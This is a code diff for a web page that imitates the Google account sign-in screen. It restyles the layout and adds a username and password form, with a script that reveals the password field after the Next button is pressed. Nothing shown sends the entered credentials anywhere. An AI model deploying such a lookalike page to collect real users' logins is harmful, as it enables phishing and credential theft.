@@ -34,7 +34,7 @@
         }
 
         main {
-            position: relative; /* Allows child elements to use absolute positioning */
+            position: relative;
             flex: 1;
             display: flex;
             flex-direction: column;
@@ -45,28 +45,26 @@
         }
 
         .container {
-            position: absolute; /* Allows movement with top and left */
-            top: 200px; /* Adjust this value to move the box vertically */
-            left: -200px; /* Adjust this value to move the box horizontally */
+            position: relative;
             display: flex;
             justify-content: space-between;
             align-items: flex-start;
-            width: 1000px; /* Increased width significantly */
+            width: 1000px;
             border-radius: 25px;
-            padding: 60px 50px; /* Increased padding for bigger box */
-            background: #ffffff; /* Set background to plain white */
+            padding: 60px 50px;
+            background: #ffffff;
         }
 
         .left-content {
             flex: 1;
-            margin-right: 40px; /* Increased margin between left and right content */
+            margin-right: 40px;
             display: flex;
             flex-direction: column;
-            align-items: flex-start; /* Align content to the left */
+            align-items: flex-start;
         }
 
         .logo {
-            margin-bottom: 16px; /* Reduced spacing between logo and text */
+            margin-bottom: 16px;
             height: 40px;
             position: relative;
             top: -10px;
@@ -77,14 +75,14 @@
             flex: 2;
             display: flex;
             flex-direction: column;
-            align-items: flex-start; /* Align items to the left */
-            margin-top: auto; /* Push content to the bottom */
+            align-items: flex-start;
+            margin-top: auto;
         }
 
         h1 {
-            font-size: 32px; /* Increased font size */
-            font-weight: 400; /* Reduced boldness */
-            margin-bottom: 8px; /* Reduced spacing between heading and subtitle */
+            font-size: 32px;
+            font-weight: 400;
+            margin-bottom: 8px;
         }
 
         .subtitle {
@@ -96,11 +94,13 @@
 
         .form-group {
             width: 100%;
-            margin-bottom: 8px; /* Add spacing below the input */
+            margin-bottom: 16px;
         }
 
         input {
             width: 100%;
+            max-width: 600px;
+            min-width: 500px;
             height: 54px;
             border: 1px solid #dadce0;
             border-radius: 4px;
@@ -115,7 +115,7 @@
         }
 
         .forgot-email {
-            margin-bottom: 16px; /* Add spacing below the "Forgot email?" link */
+            margin-bottom: 16px;
             color: #1a73e8;
             text-decoration: none;
             font-weight: 500;
@@ -146,11 +146,12 @@
 
         .button-group {
             display: flex;
-            justify-content: flex-end; /* Align buttons to the right */
-            align-items: center; /* Center items vertically */
-            gap: 16px; /* Add spacing between the link and button */
-            margin-top: auto; /* Push buttons to the bottom */
-            align-self: flex-end; /* Align the group to the bottom-right */
+            justify-content: flex-end;
+            align-items: center;
+            position: absolute;
+            bottom: 20px;
+            right: 120px;
+            gap: 16px;
         }
 
         .create-account {
@@ -173,11 +174,11 @@
 
         button:hover {
             background: #1557b0;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
         }
 
         footer {
-            background: #f0f4f9; /* Match the background color of the page */
+            background: #f0f4f9;
             padding: 24px;
             display: flex;
             justify-content: space-between;
@@ -187,7 +188,7 @@
 
         .footer-left select {
             border: none;
-            background: #f0f4f9; /* Match the background color of the page */
+            background: #f0f4f9;
             color: #757575;
             font-size: 12px;
             padding: 4px;
@@ -198,6 +199,10 @@
             color: #757575;
             text-decoration: none;
             margin-left: 24px;
+        }
+
+        .hidden {
+            display: none;
         }
     </style>
 </head>
@@ -219,15 +224,20 @@
                 <p class="subtitle">Use your Google Account</p>
             </div>
             <div class="right-content">
-                <div class="form-group">
-                    <input type="email" placeholder="Email or phone">
-                </div>
+                <form id="login-form">
+                    <div class="form-group">
+                        <input type="text" id="brukernavn" name="brukernavn" placeholder="Email or phone" required>
+                    </div>
+                    <div class="form-group hidden" id="password-group">
+                        <input type="password" id="passord" name="passord" placeholder="Password" required>
+                    </div>
+                    <div class="button-group">
+                        <a href="#" class="create-account">Create account</a>
+                        <button type="button" id="next-button" style="border-radius: 20px;">Next</button>
+                    </div>
+                </form>
                 <a href="#" class="forgot-email">Forgot email?</a>
                 <p class="info-text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="learn-more">Learn more about using Guest mode</a></p>
-                <div class="button-group">
-                    <a href="#" class="create-account">Create account</a>
-                    <button type="button" style="border-radius: 20px;">Next</button>
-                </div>
             </div>
         </div>
     </main>
@@ -245,5 +255,18 @@
             <a href="#">Terms</a>
         </div>
     </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const nextButton = document.getElementById('next-button');
+            const passwordGroup = document.getElementById('password-group');
+
+            nextButton.addEventListener('click', () => {
+                // Show the password field
+                passwordGroup.classList.remove('hidden');
+                nextButton.classList.add('hidden'); // Hide the "Next" button
+            });
+        });
+    </script>
 </body>
 </html>
